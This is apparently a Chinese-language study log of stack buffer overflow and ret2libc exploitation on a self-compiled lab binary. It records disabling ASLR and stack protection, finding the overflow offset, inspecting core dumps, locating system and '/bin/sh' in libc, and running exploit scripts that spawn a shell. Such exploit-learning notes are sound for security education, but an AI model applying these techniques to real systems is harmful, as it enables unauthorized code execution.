# shellcode_learning
这个日志记录了学习shellcode过程和在学习过程中遇到的问题。<br><br>
主要参考了蒸米的一步一步学ROP，修改了作者的部分错误和一些其他博客。<br><br>

## 配置环境
操作系统：ubuntu16.04 LTS 64位系统（建议不使用ubuntu18,可能使用了更加复杂的地址保护机制，容易导致实验失败）<br>
编译工具：
1. python2 <br>
2. pwntools(py的库函数，安装方法见https://www.cnblogs.com/pcat/p/5451780.html ）<br>
3. objdump <br>
4. ROPgadget<br>

## linux_84
### Control Flow Hijack 程序流劫持
$ gcc -fno-stack-protector -z execstack  -m32 -o level1 level1.c<br>
因为ubuntu16.04是64位系统在编译 -m32 时会报错，因为需要安装安装库文件sudo apt-get install gcc-4.8-multilib g++-4.8-multilib<br>
$ sudo -s<br>
$ echo 0 > /proc/sys/kernel/randomize_va_space<br>
$ exit<br>
$ python pattern.py create 150得到<br>
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9<br>
$ gdb ./level1<br>
（gdb)run 得到<br>
Program received signal SIGSEGV, Segmentation fault.<br>
0x37654136 in ?? ()<br>
（gdb）quit<br>
$ python pattern.py offset 0x37654136 得到<br>
hex pattern decoded as: 6Ae7<br>
140<br>
$ ulimit -c unlimited<br>
$ sudo sh -c 'echo "/tmp/core.%t" > /proc/sys/kernel/core_pattern'<br>
$ ./level1 得到<br>
ABCDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
段错误 (核心已转储)<br>
$ gdb level1 /tmp/core.1545029320<br>
Program terminated with signal SIGSEGV, Segmentation fault.<br>
#0  0x41414141 in ?? ()<br>
(gdb) x/10s $esp -144<br>
0xffffd000:	"ABCD", 'A' <repeats 140 times>, "\nS\373\367\260\320\377\377"<br>
0xffffd099:	""<br>
$ python exp1.py<br>
$ python exp1.py<br>
[+] Starting local process './level1': pid 14146<br>
[*] Switching to interactive mode<br>
$ whoami<br>
[用户名] <br><br>

### Ret2libc – Bypass DEP 通过ret2libc绕过DEP防护
$  gcc -fno-stack-protector -m32 -o level2 level1.c<br>
$ gdb ./level2<br>
(gdb) break main<br>
Breakpoint 1 at 0x80484ea<br>
(gdb) run<br>
Breakpoint 1, 0x080484ea in main ()<br>
(gdb) print system 得到<br>
$1 = {<text variable, no debug info>} 0xf7e3f940 <system><br>
(gdb) print __libc_start_main<br>
$2 = {<text variable, no debug info>} 0xf7e1d540 <__libc_start_main><br>
(gdb) find 0xf7e1d540, +2200000, "/bin/sh"<br>
0xf7f5e02b<br>
(gdb）quit
$ python exp2.py
[+] Starting local process './level2': pid 14319
[*] Switching to interactive mode
$ whoami<br>
[用户名] <br><br>
